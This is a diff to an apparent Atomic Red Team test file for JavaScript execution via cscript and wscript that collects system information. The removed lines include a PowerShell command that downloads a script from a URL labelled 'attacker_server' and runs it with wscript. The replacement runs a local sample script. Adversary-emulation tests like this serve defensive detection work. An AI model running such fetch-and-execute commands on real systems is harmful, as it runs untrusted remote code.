@@ -5,7 +5,7 @@ atomic_tests:
   auto_generated_guid: 05c15252-cd7f-11eb-b8bc-0242ac130003
   description: |-
     Javascript execution test, execute javacript via cscript.
-    When successful, system information will be written to $env:TEMP\T1059.007.out.txt.
+    When successful, system information will be written to $env:TEMP\T1059.007A.out.txt.
   supported_platforms:
   - windows
   input_arguments:
@@ -18,7 +18,7 @@ atomic_tests:
     cleanup_command: |-      
       Remove-Item $env:TEMP\T1059.007A.out.txt -ErrorAction Ignore
     name: powershell
-
+    
 - name: Javascript execution to gather local computer information - wscript
   auto_generated_guid: 8df71742-cd7f-11eb-b8bc-0242ac130003
   description: |
@@ -28,15 +28,11 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:        
-    attacker_server:
-      description: Attacker Server URL
-      type: URL
-      default: "https://raw.githubusercontent.com/crav3r/atomic-red-team/round4test/atomics/T1059.007A/src/sys_info.js"
+    javascript:
+      description: Path to sample script
+      type: String
+      default: PathToAtomicsFolder\T1059.007A\src\sys_info.js   
   executor:
-    command: |
-      Invoke-WebRequest #{attacker_server} -OutFile "$env:TEMP\sys_info.js"
-      wscript $env:TEMP\sys_info.js > $env:TEMP\T1059.007A.out.txt
-    cleanup_command: |
-      Remove-Item $env:TEMP\sys_info.js -ErrorAction Ignore
-      Remove-Item $env:TEMP\T1059.007A.out.txt -ErrorAction Ignore
+    command: |      
+      cmd /c wscript #{javascript}
     name: powershell
